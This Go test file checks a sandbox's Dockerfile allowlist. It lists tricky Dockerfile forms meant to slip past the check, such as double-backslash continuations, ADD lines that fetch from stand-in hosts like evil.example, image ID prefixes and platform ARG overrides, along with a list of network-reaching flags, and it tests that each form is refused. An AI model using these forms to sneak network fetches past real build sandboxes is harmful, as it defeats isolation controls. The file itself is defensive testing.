package sandbox

import (
	"context"
	"errors"
	"regexp"
	"slices"
	"strings"
	"testing"
)

// dockerfileOutsideForm are Dockerfiles the v0.2 re-check found, or forms
// next to them, that the check does not fully understand. Each was proved
// with BuildKit v0.31.2's and Buildah's (openshift/imagebuilder v1.2.22)
// own parsers, and the first four with Docker 29.7 itself: `docker build
// --network=none --pull=false` contacted Docker Hub for each.
var dockerfileOutsideForm = map[string]struct{ file, rule string }{
	// BuildKit reads from= by stage name only, so from=0 is an image.
	"mount from index": {"FROM busybox\nRUN --mount=type=bind,from=0,target=/x true\n", ruleImageName},
	// `image inspect` finds a local image by an ID prefix; the build pulls the name.
	"FROM ID prefix":       {"FROM 526f\nRUN true\n", ruleImageName},
	"FROM sha256 prefix":   {"FROM sha256:526f86d9\n", ruleImageName},
	"COPY from ID prefix":  {"FROM busybox\nCOPY --from=526f86d9 /a /b\n", ruleImageName},
	"COPY from high index": {"FROM busybox\nCOPY --from=3 /a /b\n", ruleImageName},
	// A global ARG replaces BuildKit's own platform arguments; Docker then
	// fetched the ppc64le layers of a local multi-platform image.
	"platform ARG":           {"ARG BUILDPLATFORM=linux/ppc64le\nFROM --platform=$BUILDPLATFORM busybox\n", rulePlatform},
	"platform ARG second":    {"ARG X=1 TARGETPLATFORM=linux/arm64\nFROM --platform=${TARGETPLATFORM} busybox\n", rulePlatform},
	"platform ARG quoted":    {"ARG \"BUILDPLATFORM=linux/arm64\"\nFROM --platform=$BUILDPLATFORM busybox\n", rulePlatform},
	"platform ARG escaped":   {"ARG BUILD\\PLATFORM=linux/arm64\nFROM busybox\n", rulePlatform},
	"platform ARG continued": {"ARG BUILDPLAT\\\nFORM=linux/arm64\nFROM --platform=$BUILDPLATFORM busybox\n", rulePlatform},
	// Buildah (Podman) continues a line that ends in two backslashes,
	// BuildKit does not: Buildah reads `ADD a \http://...`.
	"double backslash Podman":        {"FROM busybox\nADD a \\\\\nhttp://evil.example/x /x\n", ruleContinuation},
	"double backslash space":         {"FROM busybox\nRUN true \\\\ \t\nADD http://evil.example/x /x\n", ruleContinuation},
	"triple backslash":               {"FROM busybox\nRUN true \\\\\\\nhttp://evil.example/x /x\n", ruleContinuation},
	"unknown instruction":            {"FROM busybox\nhttp://evil.example/x /x\n", ruleInstruction},
	"unknown instruction ARGS":       {"FROM busybox\nCOPYX a b\n", ruleInstruction},
	"flag on other instruction":      {"FROM busybox\nWORKDIR --x=y /a\n", ruleFlag},
	"healthcheck unknown flag":       {"FROM busybox\nHEALTHCHECK --network=host CMD true\n", ruleFlag},
	"ADD from":                       {"FROM busybox\nADD --from=evil.example/x /a /b\n", ruleFlag},
	"ADD keep git dir":               {"FROM busybox\nADD --keep-git-dir=true a /b\n", ruleFlag},
	"ADD unpack":                     {"FROM busybox\nADD --unpack=true a /b\n", ruleFlag},
	"COPY platform":                  {"FROM busybox\nCOPY --platform=linux/arm64 --from=busybox /a /b\n", ruleFlag},
	"ADD host colon":                 {"FROM busybox\nADD github.com:o/r.git /x\n", ruleRemoteAdd},
	"ADD git ref":                    {"FROM busybox\nADD github.com/o/r.git#main /x\n", ruleRemoteAdd},
	"ADD at":                         {"FROM busybox\nADD a@b /x\n", ruleRemoteAdd},
	"ADD JSON invalid":               {"FROM busybox\nADD [\"a\", \"b\t http://e.example/y c\"]\n", ruleJSON},
	"ADD JSON not strings":           {"FROM busybox\nADD [\"a\", 1, \"/b\"]\n", ruleJSON},
	"ADD JSON trailing":              {"FROM busybox\nADD [\"http://e.example/y\", \"/b\"]]\n", ruleJSON},
	"ADD JSON colon":                 {"FROM busybox\nADD [\"a:b\", \"/b\"]\n", ruleRemoteAdd},
	"COPY JSON invalid":              {"FROM busybox\nCOPY [\"a\", \"/b\"] x\n", ruleJSON},
	"mount unknown key":              {"FROM busybox\nRUN --mount=type=bind,id=x,target=/x true\n", ruleMount},
	"mount empty field":              {"FROM busybox\nRUN --mount=type=bind,,target=/x true\n", ruleMount},
	"mount spaced key":               {"FROM busybox\nRUN --mount=type=bind,\tfrom=evil.example/x,target=/x true\n", ruleMount},
	"mount type upper":               {"FROM busybox\nRUN --mount=type=Cache,target=/x true\n", ruleMount},
	"mount variable":                 {"FROM busybox\nRUN --mount=type=bind,target=$T true\n", ruleMount},
	"FROM stage other case":          {"FROM busybox AS build\nFROM Build\n", ruleStageName},
	"stage name twice":               {"FROM busybox AS a\nFROM alpine:3 AS a\nCOPY --from=a /a /b\n", ruleStageName},
	"stage name starts with a digit": {"FROM busybox AS 0x\nCOPY --from=0x /a /b\n", ruleStageName},
}

// TestDockerfileOutsideFormRefused is the protection test for the v0.2
// Dockerfile re-check: each form the check does not fully understand, and
// each the builders read as a fetch, is refused.
func TestDockerfileOutsideFormRefused(t *testing.T) {
	for name, tt := range dockerfileOutsideForm {
		t.Run(name, func(t *testing.T) {
			if _, _, rule := checkDockerfile([]byte(tt.file)); rule != tt.rule {
				t.Errorf("rule %q, want %q", rule, tt.rule)
			}
		})
	}
}

// buildkitInstructions are every instruction BuildKit and Buildah know.
var buildkitInstructions = []string{"ADD", "ARG", "CMD", "COPY", "ENTRYPOINT", "ENV", "EXPOSE", "FROM", "HEALTHCHECK",
	"LABEL", "MAINTAINER", "ONBUILD", "RUN", "SHELL", "STOPSIGNAL", "USER", "VOLUME", "WORKDIR"}

// buildkitFlags are flags BuildKit or Buildah take that can fetch, reach
// a network or the host, or keep state; none may be accepted anywhere.
var buildkitFlags = []string{"network", "security", "device", "checksum", "keep-git-dir", "unpack", "platform"}

// TestDockerfileAllowlistIsClosed proves the check is an allowlist: only
// ONBUILD among the builders' instructions is refused by name, a made-up
// keyword is refused, and no instruction but FROM takes --platform, none
// takes a fetching or network flag.
func TestDockerfileAllowlistIsClosed(t *testing.T) {
	for _, kw := range append(buildkitInstructions, "FOO", "ADDX") {
		_, known := instructionFlags[kw]
		if want := kw != "ONBUILD" && kw != "FOO" && kw != "ADDX"; known != want {
			t.Errorf("%s listed %v, want %v", kw, known, want)
		}
		_, _, rule := checkDockerfile([]byte("FROM busybox\n" + kw + " x y\n"))
		if !known && rule != ruleInstruction && rule != ruleOnbuild {
			t.Errorf("%s accepted (rule %q)", kw, rule)
		}
	}
	for kw, allowed := range instructionFlags {
		for _, flag := range buildkitFlags {
			if slices.Contains(allowed, flag) && (kw != "FROM" || flag != "platform") {
				t.Errorf("%s takes --%s", kw, flag)
			}
			file := "FROM busybox\n" + strings.ToLower(kw) + " --" + flag + "=x y z\n"
			if kw == "FROM" {
				continue
			}
			if _, _, rule := checkDockerfile([]byte(file)); rule != ruleFlag {
				t.Errorf("%q: rule %q, want %q", file, rule, ruleFlag)
			}
		}
	}
}

// TestBuildUsesCheckedDockerfile: the context is a second read of the
// repository, so a Dockerfile that changes between the check and the copy
// must not reach the builder.
func TestBuildUsesCheckedDockerfile(t *testing.T) {
	reads := 0
	repo := Repo{Paths: []string{"Dockerfile"}, Read: func(p string) ([]byte, error) {
		if p != "Dockerfile" {
			return nil, errors.New("no such file")
		}
		if reads++; reads == 1 {
			return []byte(plainDockerfile), nil
		}
		return []byte("FROM alpine:3\nADD https://evil.example/x /x\n"), nil
	}}
	rec := withBuilds(&recorder{}, 0)
	app, err := testSandbox(t, rec).Build(context.Background(), repo)
	if err != nil || app.Unavailable != BuildDockerfileRefused || app.Detail != "changed" {
		t.Fatalf("Build = %+v, %v; want unavailable %s changed", app, err, BuildDockerfileRefused)
	}
	if n := len(rec.to("build")); n != 0 {
		t.Errorf("%d builds started", n)
	}
}

// builderProblems adds to the fuzz oracle what the v0.2 re-check found
// with the builders themselves: an image `image inspect` could read as an
// ID, a line Buildah joins and BuildKit does not, a keyword neither
// builder knows (so the lines were split differently), and an ARG that
// sets a platform argument.
func builderProblems(data []byte, images []string) []string {
	var problems []string
	for _, img := range images {
		if regexp.MustCompile(`(?i)^(sha256:)?[0-9a-f]+$`).MatchString(img) {
			problems = append(problems, "image read as an ID: "+img)
		}
	}
	text := strings.TrimPrefix(string(data), "\xef\xbb\xbf")
	for _, l := range strings.Split(text, "\n") {
		if strings.HasSuffix(strings.TrimRight(l, " \t\r"), `\\`) {
			problems = append(problems, "Buildah continues: "+l)
		}
	}
	for _, line := range oracleLines(text) {
		fields := buildkitSpace.Split(strings.Trim(line, "\t\v\f\r "), -1)
		keyword := strings.ToUpper(fields[0])
		if keyword != "" && keyword != "#SYNTAX" && !slices.Contains(buildkitInstructions, keyword) {
			problems = append(problems, "unknown keyword: "+line)
		}
		if keyword == "ARG" && strings.Contains(strings.ToUpper(line), "PLATFORM") && strings.Contains(line, "=") {
			problems = append(problems, "platform argument set: "+line)
		}
	}
	return problems
}

// TestStageReferencesOnlyEarlierStages (#274 F3, v0.2 Dockerfile
// re-check): FROM names an earlier stage only by its exact lower-case
// name, COPY --from by name in any case or by an index below the number
// of earlier stages, RUN --mount from= by name only (BuildKit reads
// from=0 as the image docker.io/library/0). Every other reference is an
// image to check, and one `image inspect` could read as an image ID (a
// hex prefix: FROM 526f inspects a local image, then the build pulls
// docker.io/library/526f) is refused.
func TestStageReferencesOnlyEarlierStages(t *testing.T) {
	tests := map[string]struct {
		file   string
		images []string
		rule   string
	}{
		"FROM later stage":    {"FROM late\nFROM alpine:3 AS late\n", []string{"alpine:3", "late"}, ""},
		"from later name":     {"FROM alpine:3\nCOPY --from=late /x /x\nFROM scratch AS late\n", []string{"alpine:3", "late"}, ""},
		"FROM number":         {"FROM 1234\n", nil, ruleImageName},
		"FROM hex name":       {"FROM b\nFROM alpine:3 AS b\n", nil, ruleImageName},
		"FROM ID prefix":      {"FROM 526f\n", nil, ruleImageName},
		"FROM sha256 prefix":  {"FROM sha256:526f86d9\n", nil, ruleImageName},
		"FROM stage case":     {"FROM alpine:3 AS build\nFROM Build\n", nil, ruleStageName},
		"from index too high": {"FROM alpine:3\nCOPY --from=1 /x /x\n", nil, ruleImageName},
		"copy from ID":        {"FROM alpine:3\nCOPY --from=526F86D9 /x /x\n", nil, ruleImageName},
		"mount index":         {"FROM alpine:3\nRUN --mount=type=bind,from=0,target=/a true\n", nil, ruleImageName},
		"mount index later":   {"FROM alpine:3 AS a\nFROM alpine:3\nRUN --mount=from=1,target=/a true\n", nil, ruleImageName},
		"stage named twice":   {"FROM alpine:3 AS a\nFROM busybox AS A\n", nil, ruleStageName},
		"stage name digit":    {"FROM alpine:3 AS 0x\n", nil, ruleStageName},
	}
	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			images, _, rule := checkDockerfile([]byte(tt.file))
			if rule != tt.rule || !slices.Equal(images, tt.images) {
				t.Errorf("images %q rule %q, want %q %q", images, rule, tt.images, tt.rule)
			}
		})
	}
}
